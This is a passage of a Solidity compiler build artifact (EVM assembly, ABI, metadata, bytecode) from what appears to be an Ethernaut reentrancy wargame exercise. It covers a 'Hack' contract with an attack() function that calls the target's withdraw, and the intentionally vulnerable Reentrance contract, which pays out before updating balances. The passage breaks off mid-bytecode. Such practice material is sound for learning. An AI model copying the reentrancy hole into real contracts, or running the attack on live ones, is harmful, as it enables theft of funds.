											"end": 1042,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "DUP9",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "45"
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "tag",
											"source": 1,
											"value": "45"
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "47"
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "tag",
											"source": 1,
											"value": "47"
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 989,
											"end": 1042,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1055,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 1053,
											"end": 1055,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1053,
											"end": 1055,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1055,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1055,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1055,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 1053,
											"end": 1055,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1055,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1055,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1055,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1053,
											"end": 1055,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1064,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1053,
											"end": 1064,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1064,
											"name": "PUSH",
											"source": 1,
											"value": "2E1A7D4D"
										},
										{
											"begin": 1065,
											"end": 1080,
											"name": "PUSH",
											"source": 1,
											"value": "5AF3107A4000"
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "tag",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "50"
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "tag",
											"source": 1,
											"value": "50"
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1081,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 945,
											"end": 1089,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"attack()": "9e5faafc",
							"getBalance()": "12065fe0",
							"getEthAmount()": "087d01df",
							"reFund()": "0ff0a4df"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getEthAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"reFund\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"security/etheranut/Reentrance/Reentrance.sol\":\"Hack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xcc78a17dd88fa5a2edc60c8489e2f405c0913b377216a5b26b35656b2d0dab52\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://526dc85e1f9b9b45830e202568d267d93dde7a4fcccf4ad7798dadcd92304d3c\",\"dweb:/ipfs/QmaoXMB972J3cSDLtBq3xBo4jLwqD2uzXTwujtSPqkYVhR\"]},\"security/etheranut/Reentrance/Reentrance.sol\":{\"keccak256\":\"0xd16dc537994c7a77d6625a86ed27c5d51ef804f04a5c24c43a8662b28daecef7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://8fe505fbdb28143c74584d613471ecad8649489b5d0fda3e23545da9759483cd\",\"dweb:/ipfs/QmTwuUHP6FkFmyXsqFmptxmD7qeG4TC36DAUpPrVEwTFCm\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 441,
								"contract": "security/etheranut/Reentrance/Reentrance.sol:Hack",
								"label": "target",
								"offset": 0,
								"slot": "0",
								"type": "t_address_payable"
							},
							{
								"astId": 446,
								"contract": "security/etheranut/Reentrance/Reentrance.sol:Hack",
								"label": "re",
								"offset": 0,
								"slot": "1",
								"type": "t_contract(Reentrance)435"
							}
						],
						"types": {
							"t_address_payable": {
								"encoding": "inplace",
								"label": "address payable",
								"numberOfBytes": "20"
							},
							"t_contract(Reentrance)435": {
								"encoding": "inplace",
								"label": "contract Reentrance",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"Reentrance": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_who",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "balance",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "balances",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_to",
									"type": "address"
								}
							],
							"name": "donate",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "_amount",
									"type": "uint256"
								}
							],
							"name": "withdraw",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"security/etheranut/Reentrance/Reentrance.sol\":116:794  contract Reentrance {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":116:794  contract Reentrance {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x362a95\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x27e235e3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x2e1a7d4d\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":230:337  function donate(address _to) public payable {\r... */\n    tag_3:\n      tag_9\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_10\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_10:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_11\n      jump\t// in\n    tag_9:\n      stop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":178:221  mapping(address => uint256) public balances */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      tag_13\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_15\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":464:754  function withdraw(uint256 _amount) public {\r... */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      tag_17\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_18\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_18:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_19\n      jump\t// in\n    tag_17:\n      stop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":345:456  function balanceOf(address _who) public view returns (uint256 balance) {\r... */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_20\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_20:\n      pop\n      tag_21\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_22\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_22:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_23\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":230:337  function donate(address _to) public payable {\r... */\n    tag_11:\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":301:329  balances[_to].add(msg.value) */\n      tag_25\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":319:328  msg.value */\n      callvalue\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":301:309  balances */\n      0x00\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":301:314  balances[_to] */\n      dup1\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":310:313  _to */\n      dup5\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":301:314  balances[_to] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":301:318  balances[_to].add */\n      tag_26\n      swap1\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":301:329  balances[_to].add(msg.value) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_25:\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":285:293  balances */\n      0x00\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":285:298  balances[_to] */\n      dup1\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":294:297  _to */\n      dup4\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":285:298  balances[_to] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":285:329  balances[_to] = balances[_to].add(msg.value) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":230:337  function donate(address _to) public payable {\r... */\n      pop\n      jump\t// out\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":178:221  mapping(address => uint256) public balances */\n    tag_15:\n      mstore(0x20, 0x00)\n      dup1\n      0x00\n      mstore\n      keccak256(0x00, 0x40)\n      0x00\n      swap2\n      pop\n      swap1\n      pop\n      sload\n      dup2\n      jump\t// out\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":464:754  function withdraw(uint256 _amount) public {\r... */\n    tag_19:\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":545:552  _amount */\n      dup1\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":521:529  balances */\n      0x00\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":521:541  balances[msg.sender] */\n      dup1\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":530:540  msg.sender */\n      caller\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":521:541  balances[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":521:552  balances[msg.sender] >= _amount */\n      lt\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":517:747  if (balances[msg.sender] >= _amount) {\r... */\n      tag_28\n      jumpi\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":570:581  bool result */\n      0x00\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":586:596  msg.sender */\n      caller\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":586:601  msg.sender.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":609:616  _amount */\n      dup3\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":586:621  msg.sender.call{value: _amount}(\"\") */\n      mload(0x40)\n      dup1\n      0x00\n      add\n      swap1\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_31\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_30)\n    tag_31:\n      0x60\n      swap2\n      pop\n    tag_30:\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":569:621  (bool result,) = msg.sender.call{value: _amount}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":728:735  _amount */\n      dup2\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":704:712  balances */\n      0x00\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":704:724  balances[msg.sender] */\n      dup1\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":713:723  msg.sender */\n      caller\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":704:724  balances[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":704:735  balances[msg.sender] -= _amount */\n      dup3\n      dup3\n      sload\n      sub\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":517:747  if (balances[msg.sender] >= _amount) {\r... */\n      pop\n    tag_28:\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":464:754  function withdraw(uint256 _amount) public {\r... */\n      pop\n      jump\t// out\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":345:456  function balanceOf(address _who) public view returns (uint256 balance) {\r... */\n    tag_23:\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":399:414  uint256 balance */\n      0x00\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":434:442  balances */\n      dup1\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":434:448  balances[_who] */\n      0x00\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":443:447  _who */\n      dup4\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":434:448  balances[_who] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":427:448  return balances[_who] */\n      swap1\n      pop\n        /* \"security/etheranut/Reentrance/Reentrance.sol\":345:456  function balanceOf(address _who) public view returns (uint256 balance) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"@openzeppelin/contracts/math/SafeMath.sol\":2690:2865  function add(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_26:\n        /* \"@openzeppelin/contracts/math/SafeMath.sol\":2748:2755  uint256 */\n      0x00\n        /* \"@openzeppelin/contracts/math/SafeMath.sol\":2767:2776  uint256 c */\n      dup1\n        /* \"@openzeppelin/contracts/math/SafeMath.sol\":2783:2784  b */\n      dup3\n        /* \"@openzeppelin/contracts/math/SafeMath.sol\":2779:2780  a */\n      dup5\n        /* \"@openzeppelin/contracts/math/SafeMath.sol\":2779:2784  a + b */\n      add\n        /* \"@openzeppelin/contracts/math/SafeMath.sol\":2767:2784  uint256 c = a + b */\n      swap1\n      pop\n        /* \"@openzeppelin/contracts/math/SafeMath.sol\":2807:2808  a */\n      dup4\n        /* \"@openzeppelin/contracts/math/SafeMath.sol\":2802:2803  c */\n      dup2\n        /* \"@openzeppelin/contracts/math/SafeMath.sol\":2802:2808  c >= a */\n      lt\n      iszero\n        /* \"@openzeppelin/contracts/math/SafeMath.sol\":2794:2840  require(c >= a, \"SafeMath: addition overflow\") */\n      tag_35\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x1b\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_35:\n        /* \"@openzeppelin/contracts/math/SafeMath.sol\":2857:2858  c */\n      dup1\n        /* \"@openzeppelin/contracts/math/SafeMath.sol\":2850:2858  return c */\n      swap2\n      pop\n      pop\n        /* \"@openzeppelin/contracts/math/SafeMath.sol\":2690:2865  function add(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122064a5caa96e52786f7176764eed41eb915850f9c309254d0e333e5a753af0ef8164736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5061044a806100206000396000f3fe6080604052600436106100425760003560e01c8062362a951461004e57806327e235e3146100925780632e1a7d4d146100f757806370a082311461013257610049565b3661004957005b600080fd5b6100906004803603602081101561006457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610197565b005b34801561009e57600080fd5b506100e1600480360360208110156100b557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061022d565b6040518082815260200191505060405180910390f35b34801561010357600080fd5b506101306004803603602081101561011a57600080fd5b8101908080359060200190929190505050610245565b005b34801561013e57600080fd5b506101816004803603602081101561015557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610344565b6040518082815260200191505060405180910390f35b6101e8346000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461038c90919063ffffffff16565b6000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050565b60006020528060005260406000206000915090505481565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054106103415760003373ffffffffffffffffffffffffffffffffffffffff16826040518060000190506000604051808303